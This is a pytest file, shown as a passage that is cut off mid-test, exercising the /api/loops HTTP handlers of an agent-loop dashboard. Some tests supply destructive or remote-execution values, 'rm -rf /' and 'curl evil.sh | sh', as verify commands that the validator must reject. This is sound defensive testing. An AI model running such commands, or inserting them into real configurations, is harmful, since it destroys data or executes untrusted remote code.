"""HTTP-layer tests for the unified /api/loops route family (Slice 2d). Drives the
handlers via make_mocked_request with a fake state + stubbed autonudge — asserting
kind-aware create, list/get/update, lifecycle action guards, nudge, delete."""

from __future__ import annotations

import asyncio

import pytest
from aiohttp import web
from aiohttp.test_utils import make_mocked_request

from personalclaw.dashboard.handlers import loop_routes as H


def _run(coro):
    return asyncio.get_event_loop().run_until_complete(coro)


@pytest.fixture(autouse=True)
def _tmp_config(monkeypatch, tmp_path):
    monkeypatch.setattr("personalclaw.loop.store.config_dir", lambda: tmp_path)
    monkeypatch.setattr("personalclaw.tasks.hierarchy.config_dir", lambda: tmp_path)
    import personalclaw.tasks.native as nat
    monkeypatch.setattr(nat, "config_dir", lambda: tmp_path, raising=False)
    return tmp_path


class _FakeSession:
    def __init__(self, key):
        self.key = key; self._trust = False; self._running = False
        self.acp_provider = ""; self.acp_provider_agent = ""; self.reasoning_effort = ""; self.acp_mode = ""
    @property
    def running(self):
        return self._running


class _FakeSse:
    def __init__(self):
        self.events = []
    def publish(self, key, event, data):
        self.events.append((key, event, data))


class _FakeConvLog:
    """Records which history keys had their transcript deleted (delete-reap test)."""
    def __init__(self):
        self.deleted = []
    def delete_session(self, key):
        self.deleted.append(key); return True


class _FakeState:
    def __init__(self):
        self._sessions = {}; self._sse = _FakeSse(); self.conversation_log = _FakeConvLog()
    def get_or_create_session(self, *, name, agent, model, workspace_dir, app, project_id=""):
        s = self._sessions.get(name) or _FakeSession(name)
        s.project_id = project_id  # S5: worker artifacts scope to the loop's Project
        self._sessions[name] = s; return s
    def push_sessions_update(self):
        pass
    def push_refresh(self, *kinds):
        pass
    def loop_sse(self):
        return self._sse


class _FakeNudge:
    def __init__(self, lid, session_name):
        self.id, self.session_name, self.active = lid, session_name, True


class _FakeSvc:
    def __init__(self):
        self._loops = {}; self._n = 0
    async def add(self, *, session_name, message, idle_secs, max_cycles, stop_sentinel_path, first_idle_secs=0):
        self._n += 1; lp = _FakeNudge(f"N{self._n}", session_name); self._loops[lp.id] = lp; return lp
    async def update(self, loop_id, **kw):
        pass
    async def remove(self, loop_id):
        self._loops.pop(loop_id, None)
    def get_by_session(self, session_name):
        return next((lp for lp in self._loops.values() if lp.session_name == session_name), None)


@pytest.fixture
def state():
    return _FakeState()


@pytest.fixture
def svc(monkeypatch):
    s = _FakeSvc()
    monkeypatch.setattr("personalclaw.autonudge.get_instance", lambda: s)
    return s


def _req(method, path, state, *, body=None, match_info=None):
    app = web.Application(); app["state"] = state
    req = make_mocked_request(method, path, match_info=match_info or {}, app=app)
    req["user"] = "alice"
    if body is not None:
        async def _json():
            return body
        req.json = _json  # type: ignore[assignment]
    return req


def _body(resp):
    import json
    return json.loads(resp.body.decode())


class TestCreate:
    def test_create_goal_kind(self, state):
        r = _run(H.api_loop_create(_req("POST", "/api/loops", state,
            body={"kind": "goal", "task": "investigate the latency regression",
                  "goal_type": "open_ended"})))
        assert r.status == 201
        d = _body(r)
        assert d["kind"] == "goal" and d["kind_config"]["goal_type"] == "open_ended"
        assert d["status"] == "ready" and d["name"]  # derived name

    def test_create_code_kind_folds_kind_config(self, state):
        r = _run(H.api_loop_create(_req("POST", "/api/loops", state,
            body={"kind": "code", "task": "add oauth login to the web app",
                  "entry_stage": "design", "verify_command": "make lint"})))
        d = _body(r)
        assert d["kind"] == "code"
        assert d["kind_config"]["entry_stage"] == "design"
        assert d["kind_config"]["verify_command"] == "make lint"

    @pytest.mark.parametrize("kind,kc_key", [
        ("general", "verify_command"), ("goal", "goal_type"),
        ("code", "entry_stage"), ("design", "token_overrides"),
    ])
    def test_create_every_kind_seeds_its_default_kind_config(self, state, kind, kc_key):
        # All four registered kinds must create via the route + come back with their
        # kind's default kind_config (general/design are the under-tested new kinds).
        r = _run(H.api_loop_create(_req("POST", "/api/loops", state,
            body={"kind": kind, "task": "do the thing thoroughly and well here"})))
        assert r.status == 201
        d = _body(r)
        assert d["kind"] == kind and d["status"] == "ready"
        assert kc_key in d["kind_config"]

    def test_create_accepts_goal_alias(self, state):
        r = _run(H.api_loop_create(_req("POST", "/api/loops", state,
            body={"kind": "goal", "goal": "research the best caching strategy"})))
        assert r.status == 201 and _body(r)["task"].startswith("research")

    def test_name_falls_back_to_classifier_title_not_mangled_task(self, state):
        # The classify→create round-trip passes `title` (not `name`); the name must use
        # that clean title, not a mid-prose truncation of a long/URL-y task.
        long_task = "There are planned roadmap items on https://code.example.com/packages/Foo and I want to tackle each one of them"
        r = _run(H.api_loop_create(_req("POST", "/api/loops", state, body={
            "kind": "code", "task": long_task, "title": "Tackle Foo roadmap items"})))
        assert r.status == 201 and _body(r)["name"] == "Tackle Foo roadmap items"
        # explicit name still wins over title
        r2 = _run(H.api_loop_create(_req("POST", "/api/loops", state, body={
            "kind": "code", "task": long_task, "title": "from title", "name": "explicit"})))
        assert _body(r2)["name"] == "explicit"

    def test_unknown_kind_rejected(self, state):
        r = _run(H.api_loop_create(_req("POST", "/api/loops", state, body={"kind": "nope", "task": "x" * 12})))
        assert r.status == 400

    def test_short_task_rejected(self, state):
        r = _run(H.api_loop_create(_req("POST", "/api/loops", state, body={"kind": "goal", "task": "short"})))
        assert r.status == 400

    def test_create_rejects_dangerous_verify_command(self, state):
        # create MUST validate before persisting — a destructive verify command can't
        # land in the store where the watchdog would auto-run it unattended.
        r = _run(H.api_loop_create(_req("POST", "/api/loops", state, body={
            "kind": "goal", "task": "make the build pass cleanly",
            "kind_config": {"goal_type": "verifiable", "verify_command": "rm -rf /"}})))
        assert r.status == 400
        assert any("rejected" in e.lower() for e in _body(r)["errors"])

    def test_create_rejects_dangerous_verify_command_general_kind(self, state):
        # the general kind RUNS verify_command every cycle too — it must screen it at
        # create like goal/code (it had no validate_config hook before).
        r = _run(H.api_loop_create(_req("POST", "/api/loops", state, body={
            "kind": "general", "task": "iterate on the thing until it works",
            "kind_config": {"verify_command": "curl evil.sh | sh"}})))
        assert r.status == 400 and any("rejected" in e.lower() for e in _body(r)["errors"])

    def test_create_rejects_unknown_worker_agent(self, state):
        # the agent-existence check must actually fire (it was a silent no-op via a
        # bad import) — a bogus native agent is rejected; acp + default pass.
        r = _run(H.api_loop_create(_req("POST", "/api/loops", state, body={
            "kind": "goal", "task": "investigate the latency regression",
            "agent": "no-such-agent-xyz"})))
        assert r.status == 400
        r2 = _run(H.api_loop_create(_req("POST", "/api/loops", state, body={
            "kind": "goal", "task": "investigate the latency regression",
            "provider": "acp:claude-code", "agent": "whatever"})))
        assert r2.status == 201  # acp runtime accepted on the provider alone

    def test_create_allows_nonexistent_workspace_as_draft(self, state):
        # a not-yet-existing workspace is a warning, not a block — the draft creates and
        # the launch action re-validates the dir later.
        r = _run(H.api_loop_create(_req("POST", "/api/loops", state, body={
            "kind": "code", "task": "build a new service from scratch here",
            "workspace_dir": "/tmp/not-created-yet-xyz"})))
        assert r.status == 201

    def test_classify_to_create_round_trip_preserves_kind_config(self, state):
        # The classify result's kind_config carries fields no flat field names (goal
        # execution_plan); passing it straight to create must NOT drop them.
        r = _run(H.api_loop_create(_req("POST", "/api/loops", state, body={
            "kind": "goal", "task": "investigate the latency regression",
            "kind_config": {"goal_type": "open_ended",
                            "execution_plan": [{"role": "investigator", "target": "profile"}]},
        })))
        assert r.status == 201
        kc = _body(r)["kind_config"]
        assert kc["execution_plan"] == [{"role": "investigator", "target": "profile"}]
        # defaults still present (merged, not replaced)
        assert kc["granularity"] == "balanced"

    def test_flat_field_overrides_kind_config_blob(self, state):
        r = _run(H.api_loop_create(_req("POST", "/api/loops", state, body={
            "kind": "goal", "task": "investigate the latency regression",
            "kind_config": {"goal_type": "open_ended"}, "goal_type": "verifiable",
        })))
        assert _body(r)["kind_config"]["goal_type"] == "verifiable"


class TestValidate:
    def test_validate_ok(self, state):
        r = _run(H.api_loop_validate(_req("POST", "/api/loops/validate", state, body={
            "kind": "goal", "task": "investigate the latency regression",
            "kind_config": {"goal_type": "open_ended"}, "max_cycles": 10})))
        assert r.status == 200 and _body(r)["can_start"] is True

    def test_validate_blocks_dangerous_verify_command(self, state):
        r = _run(H.api_loop_validate(_req("POST", "/api/loops/validate", state, body={
            "kind": "goal", "task": "make the build green",
            "kind_config": {"goal_type": "verifiable", "verify_command": "rm -rf /"},
            "max_cycles": 5})))
        d = _body(r)
        assert d["can_start"] is False and any("rejected" in e.lower() for e in d["errors"])

    def test_validate_short_task_blocked(self, state):
        r = _run(H.api_loop_validate(_req("POST", "/api/loops/validate", state, body={"kind": "goal", "task": "short"})))
        assert _body(r)["can_start"] is False

    def test_validate_non_numeric_max_cycles_is_clean_error_not_500(self, state):
        # A non-numeric max_cycles (client bug / direct API) must surface as a clean
        # validation error, NOT an unhandled int() ValueError → 500. Regression: the
        # unified validator used a raw int(config["max_cycles"]) which crashed.
        r = _run(H.api_loop_validate(_req("POST", "/api/loops/validate", state, body={
            "kind": "code", "task": "add a feature to the app thoroughly", "max_cycles": "abc"})))
        assert r.status == 200
        d = _body(r)
        assert d["can_start"] is False and any("whole number" in e.lower() for e in d["errors"])

    def test_validate_numeric_string_max_cycles_accepted(self, state):
        # JSON clients sometimes send numbers as strings — a clean integer string coerces.
        r = _run(H.api_loop_validate(_req("POST", "/api/loops/validate", state, body={
            "kind": "code", "task": "add a feature to the app thoroughly", "max_cycles": "30"})))
        assert r.status == 200 and _body(r)["can_start"] is True

    def test_validate_non_numeric_idle_secs_blocked(self, state):
        # The idle-timeout numeric guard was dropped at the cutover — restore it.
        r = _run(H.api_loop_validate(_req("POST", "/api/loops/validate", state, body={
            "kind": "code", "task": "add a feature to the app thoroughly", "idle_secs": "soon"})))
        d = _body(r)
        assert d["can_start"] is False and any("idle timeout" in e.lower() for e in d["errors"])

    def test_validate_oversized_task_blocked(self, state):
        # The unified validator must cap the task length (the composer mirrors this
        # client-side but a client check is bypassable). A pathological paste blocks
        # with a clear "too large" reason — restored after the cutover dropped it.
        from personalclaw.loop import validation as V
        r = _run(H.api_loop_validate(_req("POST", "/api/loops/validate", state, body={
            "kind": "code", "task": "x" * (V._MAX_TASK_LEN + 1)})))
        d = _body(r)
        assert d["can_start"] is False and any("too large" in e.lower() for e in d["errors"])

    def test_validate_brownfield_warns_without_workspace(self, state):
        r = _run(H.api_loop_validate(_req("POST", "/api/loops/validate", state, body={
            "kind": "code", "task": "fix the auth bug in the repo",
            "kind_config": {"project_kind": "brownfield"}, "max_cycles": 5})))
        d = _body(r)
        assert d["can_start"] is True and any("workspace" in w.lower() for w in d["warnings"])


class TestClassify:
    def test_classify_dispatches_by_kind(self, state, monkeypatch):
        # General kind returns safe defaults without touching the LLM.
        async def _fake_one_shot(prompt, use_case="background"):
            return "{}"
        monkeypatch.setattr("personalclaw.llm_helpers.one_shot_completion", _fake_one_shot)
        r = _run(H.api_loop_classify(_req("POST", "/api/loops/classify", state,
            body={"kind": "general", "task": "iterate on the readme until it's clear"})))
        assert r.status == 200
        d = _body(r)
        assert d["kind"] == "general" and d["classified"] is True
        assert d["intake_rigor"] == "minimal" and d["plan"] == []

    def test_classify_unknown_kind_rejected(self, state):
        r = _run(H.api_loop_classify(_req("POST", "/api/loops/classify", state,
            body={"kind": "nope", "task": "x" * 12})))
        assert r.status == 400

    def test_classify_short_task_rejected(self, state):
        r = _run(H.api_loop_classify(_req("POST", "/api/loops/classify", state,
            body={"kind": "goal", "task": "short"})))
        assert r.status == 400

    def test_classify_oversized_task_rejected(self, state):
        # An oversized paste is rejected BEFORE the classifier LLM runs (it would blow
        # up the prompt) — no monkeypatch needed since the guard precedes the LLM call.
        from personalclaw.loop import validation as V
        r = _run(H.api_loop_classify(_req("POST", "/api/loops/classify", state,
            body={"kind": "code", "task": "x" * (V._MAX_TASK_LEN + 1)})))
        assert r.status == 400 and "too large" in _body(r)["error"].lower()


class TestGrillTree:
    """Guided decomposition (#16) — the /api/loops/{id}/grill-tree endpoint that calls
    grill's memory-checked `tree` shape over a created loop's goal."""

    def _make(self, state) -> str:
        return _body(_run(H.api_loop_create(_req("POST", "/api/loops", state,
            body={"kind": "goal", "task": "organize a small community meetup next month",
                  "goal_type": "open_ended"}))))["id"]

    def test_grill_tree_returns_phases_and_wires_recall(self, state, monkeypatch):
        # Stub grill.grill: assert the handler passes shape='tree' + a recall closure,
        # and that its phases/memory_hits round-trip to the response.
        seen = {}

        async def _fake_grill(goal, *, shape, ask, recall=None, save=None, assess=True):
            seen["goal"] = goal; seen["shape"] = shape; seen["assess"] = assess
            seen["recall_result"] = await recall("q") if recall else None
            seen["save"] = save
            from personalclaw.grill import GrillResult
            return GrillResult(shape="tree", memory_hits=1, phases=[
                {"title": "Scope", "description": "d", "steps": [{"title": "t", "prompt": "why?"}]},
            ])

        monkeypatch.setattr("personalclaw.grill.grill", _fake_grill)
        # The recall seam reaches memory via MemoryService.semantic_context — stub the
        # provider accessor so the closure returns a deterministic block (not None).
        monkeypatch.setattr("personalclaw.dashboard.handlers.memory._get_provider", lambda _s: object())
        monkeypatch.setattr(
            "personalclaw.memory_service.MemoryService.over_vector_store",
            classmethod(lambda cls, vs: type("S", (), {"semantic_context": lambda self, q, cap=1500: "PRIOR"})()))

        lid = self._make(state)
        r = _run(H.api_loop_grill_tree(_req("POST", f"/api/loops/{lid}/grill-tree", state,
            body={}, match_info={"id": lid})))
        assert r.status == 200
        d = _body(r)
        assert d["memory_hits"] == 1
        assert d["phases"][0]["title"] == "Scope"
        assert d["phases"][0]["steps"][0]["prompt"] == "why?"
        # The handler must decompose over the loop's own task, in tree shape, with the
        # clarifying-assess pass OFF (the phases ARE the questions) + no save at gen time.
        assert seen["shape"] == "tree" and seen["assess"] is False and seen["save"] is None
        assert "meetup" in seen["goal"]
        assert seen["recall_result"] == "PRIOR"   # recall wired to the memory seam

    def test_grill_tree_404_for_nonexistent_loop(self, state):
        r = _run(H.api_loop_grill_tree(_req("POST", "/api/loops/nope/grill-tree", state,
            body={}, match_info={"id": "nope"})))
        assert r.status == 404

    def test_grill_tree_rejects_short_goal(self, state, monkeypatch):
        # A loop whose task is too short to decompose is rejected before the LLM. The
        # create validator won't accept a sub-12-char task, so stub store.get to return
        # a loop with a short task — the guard the handler enforces independently.
        short_loop = type("L", (), {"task": "short"})()
        monkeypatch.setattr("personalclaw.loop.store.get", lambda _id: short_loop)
        r = _run(H.api_loop_grill_tree(_req("POST", "/api/loops/x/grill-tree", state,
            body={}, match_info={"id": "x"})))
        assert r.status == 400 and "short" in _body(r)["error"].lower()


class TestPlanWalkthrough:
    def _make(self, state, **body):
        base = {"kind": "goal", "task": "investigate the latency regression"}
        base.update(body)
        return _body(_run(H.api_loop_create(_req("POST", "/api/loops", state, body=base))))["id"]

    def test_plan_session_404_for_nonexistent_loop(self, state):
        # A GONE loop must 404 — distinct from a live loop with no session yet
        # ({session:null}). Without the distinction the planning walkthrough can't tell
        # "deleted mid-plan" from "not started" and polls a dead loop forever.
        r = _run(H.api_loop_plan_session(_req("GET", "/api/loops/deadbeef/plan-session", state, match_info={"id": "deadbeef"})))
        assert r.status == 404

    def test_plan_session_empty_then_start_kicks(self, state, svc, monkeypatch):
        cid = self._make(state)
        # No session yet → 200 {session:null} (a REAL loop, just no session file).
        r = _run(H.api_loop_plan_session(_req("GET", f"/api/loops/{cid}/plan-session", state, match_info={"id": cid})))
        assert r.status == 200 and _body(r)["session"] is None
        # Start kicks a background advance (stub it so no planner spawns).
        seen = []
        async def _fake_advance(st, sv, lid):
            seen.append(lid); return "gated"
        monkeypatch.setattr("personalclaw.loop.plan_walkthrough.advance_plan", _fake_advance)
        r2 = _run(H.api_loop_plan_start(_req("POST", f"/api/loops/{cid}/plan/start", state, body={}, match_info={"id": cid})))
        assert r2.status == 202 and _body(r2)["planning"] is True
        _run(asyncio.sleep(0))  # let the fire-and-forget task run
        assert seen == [cid]

    def test_plan_approve_requires_session(self, state, svc):
        cid = self._make(state)
        r = _run(H.api_loop_plan_approve(_req("POST", f"/api/loops/{cid}/plan/approve", state,
            body={"step_id": "step-0"}, match_info={"id": cid})))
        assert r.status == 404

    def test_plan_step_actions_require_step_id(self, state, svc):
        # A missing/empty step_id is a malformed request (400), not a 409 "Step not
        # awaiting review" — that misleading status fell out of passing "" straight to
        # the planning session. Guard approve / comment / edit consistently (matches
        # nudge's text / queue's task_ids presence checks).
        cid = self._make(state)
        approve = _run(H.api_loop_plan_approve(_req("POST", f"/api/loops/{cid}/plan/approve", state,
            body={}, match_info={"id": cid})))
        assert approve.status == 400 and "step_id" in _body(approve)["error"]
        comment = _run(H.api_loop_plan_comment(_req("POST", f"/api/loops/{cid}/plan/comment", state,
            body={"text": "do it differently"}, match_info={"id": cid})))
        assert comment.status == 400 and "step_id" in _body(comment)["error"]
        edit = _run(H.api_loop_plan_edit(_req("POST", f"/api/loops/{cid}/plan/edit", state,
            body={"markdown": "## x"}, match_info={"id": cid})))
        assert edit.status == 400 and "step_id" in _body(edit)["error"]

    def test_plan_start_frozen_after_launch(self, state, svc):
        cid = self._make(state)
        _run(H.api_loop_action(_req("PATCH", f"/api/loops/{cid}", state, body={"action": "start"}, match_info={"id": cid})))
        r = _run(H.api_loop_plan_start(_req("POST", f"/api/loops/{cid}/plan/start", state, body={}, match_info={"id": cid})))
        assert r.status == 409


class TestQueueAutopilot:
    def _make_code(self, state):
        return _body(_run(H.api_loop_create(_req("POST", "/api/loops", state,
            body={"kind": "code", "task": "add oauth login to the web app",
                  "workspace_dir": "/tmp/ws"}))))["id"]

    def test_queue_requires_task_ids(self, state):
        cid = self._make_code(state)
        r = _run(H.api_loop_queue(_req("POST", f"/api/loops/{cid}/queue", state, body={}, match_info={"id": cid})))
        assert r.status == 400

    def test_queue_rejected_pre_launch(self, state):
        # Queueing before launch has no scheduler + no provisioned TaskLists, so any id
        # is unresolvable — and the unknown-id guard's empty-`known` allowance (meant for
        # the can't-confirm-during-provision window of a RUNNING loop) let a bogus id
        # persist into queued_task_ids, a landmine for the scheduler at start. Reject it.
        cid = self._make_code(state)  # created → 'ready'
        r = _run(H.api_loop_queue(_req("POST", f"/api/loops/{cid}/queue", state,
            body={"task_ids": ["bogus-task"]}, match_info={"id": cid})))
        assert r.status == 409 and "before the loop starts" in _body(r)["error"]
        from personalclaw.loop import store
        assert (store.get(cid).kind_config or {}).get("queued_task_ids", []) == []

    def test_queue_and_unqueue(self, state, svc):
        # Queue is a running-loop operation (the scheduler consumes queued_task_ids).
        # Start the loop first; with no provisioned TaskLists the unknown-id guard can't
        # confirm and ALLOWs (the documented can't-confirm-during-provision behavior).
        cid = self._make_code(state)
        _run(H.api_loop_action(_req("PATCH", f"/api/loops/{cid}", state, body={"action": "start"}, match_info={"id": cid})))
        r = _run(H.api_loop_queue(_req("POST", f"/api/loops/{cid}/queue", state,
            body={"task_ids": ["t-1", "t-2"]}, match_info={"id": cid})))
        assert r.status == 200 and set(_body(r)["queued_task_ids"]) == {"t-1", "t-2"}
        r2 = _run(H.api_loop_queue(_req("POST", f"/api/loops/{cid}/queue", state,
            body={"task_ids": ["t-1"], "action": "unqueue"}, match_info={"id": cid})))
        assert _body(r2)["queued_task_ids"] == ["t-2"]

    def test_autopilot_toggle(self, state):
        cid = self._make_code(state)
        r = _run(H.api_loop_autopilot(_req("POST", f"/api/loops/{cid}/autopilot", state,
            body={"on": False}, match_info={"id": cid})))
        assert r.status == 200 and _body(r)["autopilot"] is False

    def test_autopilot_requires_explicit_bool(self, state):
        # A missing/malformed `on` must 400, NOT silently default to enabling autopilot
        # (ON = the system takes over driving the plan — the consequential direction).
        cid = self._make_code(state)
        for bad in ({}, {"on": "false"}, {"on": 1}, {"on": None}):
            r = _run(H.api_loop_autopilot(_req("POST", f"/api/loops/{cid}/autopilot", state,
                body=bad, match_info={"id": cid})))
            assert r.status == 400, f"expected 400 for body {bad!r}, got {r.status}"

    def test_autopilot_rejected_on_terminal(self, state, svc):
        cid = self._make_code(state)
        _run(H.api_loop_action(_req("PATCH", f"/api/loops/{cid}", state, body={"action": "start"}, match_info={"id": cid})))
        _run(H.api_loop_action(_req("PATCH", f"/api/loops/{cid}", state, body={"action": "stop"}, match_info={"id": cid})))
        r = _run(H.api_loop_autopilot(_req("POST", f"/api/loops/{cid}/autopilot", state,
            body={"on": True}, match_info={"id": cid})))
        assert r.status == 409


class TestListGetUpdate:
    def _make(self, state, **body):
        base = {"kind": "goal", "task": "investigate the latency regression"}
        base.update(body)
        return _body(_run(H.api_loop_create(_req("POST", "/api/loops", state, body=base))))["id"]

    def test_list_and_project_filter(self, state):
        a = self._make(state, project_id="p-1")
        self._make(state, project_id="p-2")
        all_ids = {l["id"] for l in _body(_run(H.api_loop_list(_req("GET", "/api/loops", state))))["loops"]}
        assert a in all_ids
        p1 = _body(_run(H.api_loop_list(_req("GET", "/api/loops?project_id=p-1", state))))["loops"]
        # match_info has no query; emulate by setting rel_url via a fresh request
        req = _req("GET", "/api/loops?project_id=p-1", state)
        p1 = _body(_run(H.api_loop_list(req)))["loops"]
        assert {l["id"] for l in p1} == {a}

    def test_update_prelaunch_then_frozen(self, state, svc):
        cid = self._make(state)
        # prelaunch edit OK
        r = _run(H.api_loop_update(_req("PUT", f"/api/loops/{cid}", state,
            body={"task": "investigate the latency regression deeply"}, match_info={"id": cid})))
        assert r.status == 200
        # start → spec frozen
        _run(H.api_loop_action(_req("PATCH", f"/api/loops/{cid}", state, body={"action": "start"}, match_info={"id": cid})))
        r2 = _run(H.api_loop_update(_req("PUT", f"/api/loops/{cid}", state,
            body={"task": "should not change"}, match_info={"id": cid})))
        assert r2.status == 409
        # name-only rename still allowed
        r3 = _run(H.api_loop_update(_req("PUT", f"/api/loops/{cid}", state,
            body={"name": "Renamed"}, match_info={"id": cid})))
        assert r3.status == 200 and _body(r3)["name"] == "Renamed"

    def test_update_rejects_dangerous_verify_command_edit(self, state):
        # an edit can't smuggle in a destructive command create would reject.
        cid = self._make(state)
        r = _run(H.api_loop_update(_req("PUT", f"/api/loops/{cid}", state, body={
            "kind_config": {"goal_type": "verifiable", "verify_command": "rm -rf /"}},
            match_info={"id": cid})))
        assert r.status == 400 and any("rejected" in e.lower() for e in _body(r)["errors"])

    def test_update_allows_safe_spec_edit(self, state):
        cid = self._make(state)
        r = _run(H.api_loop_update(_req("PUT", f"/api/loops/{cid}", state, body={
            "kind_config": {"goal_type": "verifiable", "verify_command": "make test"}},
            match_info={"id": cid})))
        assert r.status == 200

    def test_get_400_for_malformed_id_404_for_missing(self, state):
        # A malformed id is a 400 (client bug), a well-formed-but-missing id a 404 —
        # api_loop_get conflated them (404 for both) by relying on get_redacted's
        # internal guard; now it shape-checks like every sibling.
        bad = _run(H.api_loop_get(_req("GET", "/api/loops/ZZ-nope", state, match_info={"id": "ZZ-nope"})))
        assert bad.status == 400
        missing = _run(H.api_loop_get(_req("GET", "/api/loops/deadbeef", state, match_info={"id": "deadbeef"})))
        assert missing.status == 404

    def test_report_404_for_nonexistent_loop(self, state):
        # A valid-shaped but nonexistent (or deleted) loop must 404, not 200 with empty
        # report/log — the empty-doc read is indistinguishable from a real loop that just
        # hasn't written its deliverable yet, so a client polling a deleted loop's report
        # would never learn it's gone. Matches every sibling endpoint's 404.
        r = _run(H.api_loop_report(_req("GET", "/api/loops/deadbeef/report", state, match_info={"id": "deadbeef"})))
        assert r.status == 404

    def test_report_200_for_real_loop(self, state):
        cid = self._make(state)
        r = _run(H.api_loop_report(_req("GET", f"/api/loops/{cid}/report", state, match_info={"id": cid})))
        assert r.status == 200 and "report" in _body(r) and "log" in _body(r)

    def test_workspace_rebind_recovers_blocked_loop(self, state, svc, tmp_path):
        # a started brownfield loop that went NEEDS_INPUT (workspace missing) must be
        # able to re-pick the folder even though its spec is otherwise frozen.
        ws = tmp_path / "repo"; ws.mkdir()
        cid = _body(_run(H.api_loop_create(_req("POST", "/api/loops", state, body={
            "kind": "code", "task": "fix the auth bug in the existing repo",
            "project_kind": "brownfield", "workspace_dir": str(ws)}))))["id"]
        _run(H.api_loop_action(_req("PATCH", f"/api/loops/{cid}", state, body={"action": "start"}, match_info={"id": cid})))
        from personalclaw.loop import store
        store.update_status(cid, store.LoopStatus.NEEDS_INPUT)
        new_ws = tmp_path / "moved-repo"; new_ws.mkdir()
        r = _run(H.api_loop_update(_req("PUT", f"/api/loops/{cid}", state,
            body={"workspace_dir": str(new_ws)}, match_info={"id": cid})))
        assert r.status == 200 and _body(r)["workspace_dir"] == str(new_ws)

    def test_workspace_rebind_rejected_while_running(self, state, svc, tmp_path):
        ws = tmp_path / "repo"; ws.mkdir()
        cid = _body(_run(H.api_loop_create(_req("POST", "/api/loops", state, body={
            "kind": "code", "task": "fix the auth bug in the existing repo",
            "project_kind": "brownfield", "workspace_dir": str(ws)}))))["id"]
        _run(H.api_loop_action(_req("PATCH", f"/api/loops/{cid}", state, body={"action": "start"}, match_info={"id": cid})))
        new_ws = tmp_path / "other"; new_ws.mkdir()
        r = _run(H.api_loop_update(_req("PUT", f"/api/loops/{cid}", state,
            body={"workspace_dir": str(new_ws)}, match_info={"id": cid})))
        assert r.status == 409  # a live worker holds the cwd


class TestLifecycle:
    def _make(self, state):
        return _body(_run(H.api_loop_create(_req("POST", "/api/loops", state,
            body={"kind": "goal", "task": "investigate the latency regression"}))))["id"]

    def test_start_pause_resume_stop(self, state, svc):
        cid = self._make(state)
        assert _body(_run(H.api_loop_action(_req("PATCH", f"/api/loops/{cid}", state, body={"action": "start"}, match_info={"id": cid}))))["status"] == "running"
        assert _body(_run(H.api_loop_action(_req("PATCH", f"/api/loops/{cid}", state, body={"action": "pause"}, match_info={"id": cid}))))["status"] == "paused"
        assert _body(_run(H.api_loop_action(_req("PATCH", f"/api/loops/{cid}", state, body={"action": "resume"}, match_info={"id": cid}))))["status"] == "running"
        assert _body(_run(H.api_loop_action(_req("PATCH", f"/api/loops/{cid}", state, body={"action": "stop"}, match_info={"id": cid}))))["status"] == "stopped"

    def test_start_blocked_brownfield_without_workspace(self, state, svc):
        cid = _body(_run(H.api_loop_create(_req("POST", "/api/loops", state, body={
            "kind": "code", "task": "fix the auth bug in the existing repo",
            "project_kind": "brownfield"}))))["id"]
        r = _run(H.api_loop_action(_req("PATCH", f"/api/loops/{cid}", state,
            body={"action": "start"}, match_info={"id": cid})))
        assert r.status == 422 and "workspace" in _body(r)["error"].lower()

    def test_start_allowed_brownfield_with_workspace(self, state, svc, tmp_path):
        ws = tmp_path / "repo"; ws.mkdir()
        cid = _body(_run(H.api_loop_create(_req("POST", "/api/loops", state, body={
            "kind": "code", "task": "fix the auth bug in the existing repo",
            "project_kind": "brownfield", "workspace_dir": str(ws)}))))["id"]
        r = _run(H.api_loop_action(_req("PATCH", f"/api/loops/{cid}", state,
            body={"action": "start"}, match_info={"id": cid})))
        assert r.status == 200 and _body(r)["status"] == "running"

    def test_start_allowed_greenfield_without_workspace(self, state, svc):
        cid = _body(_run(H.api_loop_create(_req("POST", "/api/loops", state, body={
            "kind": "code", "task": "build a brand new cli tool from scratch"}))))["id"]
        r = _run(H.api_loop_action(_req("PATCH", f"/api/loops/{cid}", state,
            body={"action": "start"}, match_info={"id": cid})))
        assert r.status == 200 and _body(r)["status"] == "running"

    def test_action_guard_rejects_bad_transition(self, state, svc):
        cid = self._make(state)  # READY — can't pause
        r = _run(H.api_loop_action(_req("PATCH", f"/api/loops/{cid}", state, body={"action": "pause"}, match_info={"id": cid})))
        assert r.status == 409

    def test_nudge_and_delete(self, state, svc):
        cid = self._make(state)
        _run(H.api_loop_action(_req("PATCH", f"/api/loops/{cid}", state, body={"action": "start"}, match_info={"id": cid})))
        r = _run(H.api_loop_nudge(_req("POST", f"/api/loops/{cid}/nudge", state, body={"text": "focus on the db"}, match_info={"id": cid})))
        assert r.status == 200
        d = _run(H.api_loop_delete(_req("DELETE", f"/api/loops/{cid}", state, match_info={"id": cid})))
        assert _body(d)["ok"] is True

    def test_delete_reaps_worker_and_plan_sessions(self, state, svc):
        # Deleting a loop must reap its dashboard sessions + transcripts — the worker
        # (loop-<id>), the stepwise planner (loop-plan-<id>), and a code design planner
        # (code-plan-<id>). Without this they lingered registered after delete and the
        # .jsonl files piled up over create/delete churn (a real resource leak).
        cid = self._make(state)
        _run(H.api_loop_action(_req("PATCH", f"/api/loops/{cid}", state, body={"action": "start"}, match_info={"id": cid})))
        # Seed the three sessions as if the worker + planners had registered them.
        for k in (f"loop-{cid}", f"loop-plan-{cid}", f"code-plan-{cid}"):
            state._sessions[k] = _FakeSession(k)
        _run(H.api_loop_delete(_req("DELETE", f"/api/loops/{cid}", state, match_info={"id": cid})))
        # In-memory sessions gone …
        assert f"loop-{cid}" not in state._sessions
        assert f"loop-plan-{cid}" not in state._sessions
        assert f"code-plan-{cid}" not in state._sessions
        # … and their transcripts deleted (history keys are the dashboard:-prefixed form).
        assert f"dashboard:loop-{cid}" in state.conversation_log.deleted
        assert f"dashboard:loop-plan-{cid}" in state.conversation_log.deleted

    def test_nudge_rejected_pre_launch(self, state, svc):
        # A nudge on a pre-launch loop (ready, never started) has no worker to reach —
        # it would persist an orphan steer (applied_cycle=null) the worker never sees.
        # The API must reject it (409) instead of a misleading {"ok": true}, mirroring
        # the cockpit's STEERABLE gate. Only running/resumable states accept a steer.
        cid = self._make(state)  # created → 'ready', not started
        r = _run(H.api_loop_nudge(_req("POST", f"/api/loops/{cid}/nudge", state,
            body={"text": "focus on the db"}, match_info={"id": cid})))
        assert r.status == 409 and "hasn't started" in _body(r)["error"]
        # and no orphan nudge was persisted
        from personalclaw.loop import store
        assert store.get_nudges(cid) == []

    def test_task_scoped_nudge_rejects_foreign_task_id(self, state, svc, monkeypatch):
        # A task-scoped steer whose task_id isn't among THIS loop's tasks would write
        # guidance_<id>.txt the worker never reads (orphaned steer, misleading ok). When
